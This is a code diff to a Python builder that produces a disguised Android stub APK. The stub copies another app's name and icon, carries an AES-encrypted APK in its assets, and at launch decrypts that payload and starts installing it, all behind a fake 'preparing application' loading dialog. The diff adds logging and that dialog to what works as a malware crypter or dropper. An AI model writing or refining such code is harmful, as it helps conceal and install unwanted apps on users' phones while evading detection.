@@ -2,8 +2,11 @@ import os
 import subprocess
 import shutil
 import zipfile
+import logging
 import xml.etree.ElementTree as ET
 from pathlib import Path
+
+logger = logging.getLogger(__name__)
 
 
 class StubBuilder:
@@ -16,9 +19,11 @@ class StubBuilder:
         self.key_alias = "mykey"
         self.temp_dir = Path("temp/stub_build")
         self.temp_dir.mkdir(parents=True, exist_ok=True)
+        logger.info("StubBuilder инициализирован")
     
     def extract_apk_info(self, apk_path: str) -> dict:
         """Извлекает информацию из оригинального APK"""
+        logger.info(f"Извлечение информации из APK: {apk_path}")
         aapt_path = f"{self.build_tools}/aapt"
         
         # Получаем package name и label
@@ -48,6 +53,7 @@ class StubBuilder:
                 if len(parts) >= 2:
                     info["icon"] = parts[1]
         
+        logger.info(f"APK info: package={info['package']}, label={info['label']}, icon={info['icon']}")
         return info
     
     def extract_resources(self, apk_path: str, project_dir: Path, apk_info: dict):
@@ -96,6 +102,7 @@ class StubBuilder:
     
     def build_stub_apk(self, aes_key_hex: str, original_apk_path: str, encrypted_payload: bytes) -> str:
         """Собирает stub APK с встроенным ключом и payload"""
+        logger.info(f"Начало сборки stub APK, payload size: {len(encrypted_payload)} байт")
         
         # Извлекаем информацию из оригинального APK
         apk_info = self.extract_apk_info(original_apk_path)
@@ -104,6 +111,8 @@ class StubBuilder:
         project_dir = self.temp_dir / "stub_project"
         if project_dir.exists():
             shutil.rmtree(project_dir)
+        
+        logger.info(f"Создание структуры проекта: {project_dir}")
         
         # Создаем директории
         (project_dir / "src" / "com" / "loader").mkdir(parents=True)
@@ -115,18 +124,22 @@ class StubBuilder:
         self.extract_resources(original_apk_path, project_dir, apk_info)
         
         # Сохраняем зашифрованный payload в assets
-        with open(project_dir / "assets" / "payload.bin", "wb") as f:
+        payload_file = project_dir / "assets" / "payload.bin"
+        with open(payload_file, "wb") as f:
             f.write(encrypted_payload)
+        logger.info(f"Payload сохранен: {payload_file}, размер: {len(encrypted_payload)} байт")
         
         # Генерируем LoaderActivity.java
         loader_code = self.generate_loader_activity(aes_key_hex, apk_info["package"])
         with open(project_dir / "src" / "com" / "loader" / "LoaderActivity.java", "w") as f:
             f.write(loader_code)
+        logger.info("LoaderActivity.java сгенерирован")
         
         # Генерируем AndroidManifest.xml
         manifest = self.generate_manifest()
         with open(project_dir / "AndroidManifest.xml", "w") as f:
             f.write(manifest)
+        logger.info("AndroidManifest.xml сгенерирован")
         
         # Генерируем strings.xml с названием из оригинального APK
         strings_xml = f'''<?xml version="1.0" encoding="utf-8"?>
@@ -135,19 +148,25 @@ class StubBuilder:
 </resources>'''
         with open(project_dir / "res" / "values" / "strings.xml", "w") as f:
             f.write(strings_xml)
+        logger.info(f"strings.xml сгенерирован с названием: {apk_info['label']}")
         
         # Компилируем Java -> class
+        logger.info("Компиляция Java...")
         self.compile_java(project_dir)
         
         # Конвертируем class -> dex
+        logger.info("Конвертация в DEX...")
         self.convert_to_dex(project_dir)
         
         # Собираем APK (с assets внутри)
+        logger.info("Упаковка APK...")
         unsigned_apk = self.package_apk(project_dir)
         
         # Подписываем APK
+        logger.info("Подпись APK...")
         signed_apk = self.sign_apk(unsigned_apk)
         
+        logger.info(f"Stub APK успешно собран: {signed_apk}")
         return signed_apk
     
     def compile_java(self, project_dir: Path):
@@ -268,6 +287,7 @@ class StubBuilder:
         return f'''package com.loader;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -287,12 +307,20 @@ public class LoaderActivity extends Activity {{
     protected void onCreate(Bundle savedInstanceState) {{
         super.onCreate(savedInstanceState);
         
-        Toast.makeText(this, "Загрузка...", Toast.LENGTH_SHORT).show();
+        // Показываем диалог что приложение загружается
+        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Загрузка");
+        builder.setMessage("Подготовка приложения...");
+        builder.setCancelable(false);
+        final AlertDialog dialog = builder.create();
+        dialog.show();
         
         new Thread(new Runnable() {{
             @Override
             public void run() {{
                 try {{
+                    updateDialog(dialog, "Чтение данных...");
+                    
                     // Читаем зашифрованный APK из assets
                     InputStream is = getAssets().open("payload.bin");
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -304,37 +332,46 @@ public class LoaderActivity extends Activity {{
                     byte[] encryptedApk = baos.toByteArray();
                     is.close();
                     
-                    showToast("Расшифровка...");
+                    updateDialog(dialog, "Расшифровка (" + encryptedApk.length + " байт)...");
                     
                     // Расшифровываем APK
                     final byte[] decryptedApk = decryptAES(encryptedApk);
                     
-                    showToast("Сохранение...");
+                    updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");
                     
-                    // Сохраняем расшифрованный APK в cache
+                    // Сохраняем расшифрованный APK
                     final File apkFile = new File(getCacheDir(), "app.apk");
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
                     
-                    showToast("Установка...");
-                    
-                    // Устанавливаем APK
+                    // Закрываем диалог и устанавливаем
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
+                            dialog.dismiss();
                             installApk(apkFile);
                         }}
                     }});
                     
-                }} catch (Exception e) {{
+                }} catch (final Exception e) {{
                     e.printStackTrace();
-                    final String error = e.getMessage();
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
-                            Toast.makeText(LoaderActivity.this, "Ошибка: " + error, Toast.LENGTH_LONG).show();
-                            finish();
+                            dialog.dismiss();
+                            AlertDialog.Builder errorBuilder = new AlertDialog.Builder(LoaderActivity.this);
+                            errorBuilder.setTitle("Ошибка");
+                            errorBuilder.setMessage("Не удалось загрузить приложение:\\n" + e.getMessage());
+                            errorBuilder.setPositiveButton("OK", null);
+                            AlertDialog errorDialog = errorBuilder.create();
+                            errorDialog.setOnDismissListener(new android.content.DialogInterface.OnDismissListener() {{
+                                @Override
+                                public void onDismiss(android.content.DialogInterface d) {{
+                                    finish();
+                                }}
+                            }});
+                            errorDialog.show();
                         }}
                     }});
                 }}
@@ -342,11 +379,11 @@ public class LoaderActivity extends Activity {{
         }}).start();
     }}
     
-    private void showToast(final String message) {{
+    private void updateDialog(final AlertDialog dialog, final String message) {{
         new Handler(Looper.getMainLooper()).post(new Runnable() {{
             @Override
             public void run() {{
-                Toast.makeText(LoaderActivity.this, message, Toast.LENGTH_SHORT).show();
+                dialog.setMessage(message);
             }}
         }});
     }}
